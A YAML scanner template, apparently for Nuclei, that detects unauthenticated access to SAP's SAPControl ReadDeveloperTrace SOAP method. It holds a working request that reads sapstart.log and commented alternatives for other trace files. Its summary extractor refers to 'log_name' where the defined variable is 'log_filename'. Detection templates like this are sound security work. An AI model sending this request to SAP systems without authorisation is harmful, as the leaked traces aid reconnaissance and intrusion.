id: sap-sapcontrol-readlogfile-log-disclosure

info:
  name: SAPControl - ReadDeveloperTrace Log Disclosure (unauthenticated)
  author: LRVT, l4rm4nd
  severity: medium
  description: |
    Detects SAP systems where the SAP Start Service (sapstartsrv) SAPControl
    SOAP interface exposes the ReadDeveloperTrace web method without
    authentication.

    ReadDeveloperTrace returns the content of internal trace and log files
    (for example sapstart.log, dev_work, ICM or gateway traces) from the
    instance work directory. By default, this template targets sapstart.log,
    which commonly contains:
      - Startup profile path and name
      - Environment variables (DIR_LIBRARY, LD_LIBRARY_PATH, SECUDIR, PATH, etc.)
      - Executed pre-startup commands (sapcpe calls, sapjvm, sapcrypto)
      - Child processes and command lines for dispatcher, IGS and J2EE components

    The template is parameterized via a log filename payload list so users
    can easily extend it to other developer traces or log files by adding
    more entries (for example dev_disp, dev_w*, dev_icm, dev_ms, etc.).

    Unauthenticated access to developer traces significantly supports
    reconnaissance by leaking internal hostnames, SIDs, filesystem layout,
    startup procedures and potentially sensitive configuration data.
  tags: sap,sapcontrol,soap,log,info-disclosure,recon
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/sap/sap_mgmt_con_getlogfiles.rb
    - https://itsiti.com/csmon/            # overview of SAPControl web methods incl. ReadDeveloperTrace
    - https://sapbasisinfo.com/blog/2017/01/20/sapcontrol-command-funtions-for-sap-hana/
    - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362959700.html  # protected vs unprotected sapstartsrv methods

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    payloads:
      log_filename:
        - sapstart.log
        #- dev_sapstart
        #- dev_server0
        #- dev_server1
        #- dev_icm
        #- dev_icm_sec
        #- history.glf

    headers:
      Content-Type: text/xml; charset=UTF-8
      SOAPAction: '""'
      User-Agent: Mozilla/5.0

    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
        <SOAP-ENV:Header>
          <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
            <enableSession>true</enableSession>
          </sapsess:Session>
        </SOAP-ENV:Header>
        <SOAP-ENV:Body>
          <ns1:ReadDeveloperTrace xmlns:ns1="urn:SAPControl">
            <filename>{{log_filename}}</filename>
          </ns1:ReadDeveloperTrace>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "ReadDeveloperTraceResponse"

      # Ensure there is at least some content in <lines><item>...</item>
      - type: word
        part: body
        words:
          - "<lines>"
          - "<item>"
        condition: and

    extractors:

      # Collect all items internally to count them
      - type: regex
        part: body
        name: log_lines
        internal: true
        group: 1
        regex:
          - "<item>([^<]*)</item>"

      # Compact summary for CLI output
      - type: dsl
        name: log_summary
        dsl:
          - "concat('LOG_FILE=', log_name)"
          - "concat('LOG_LINES=', len(log_lines))"
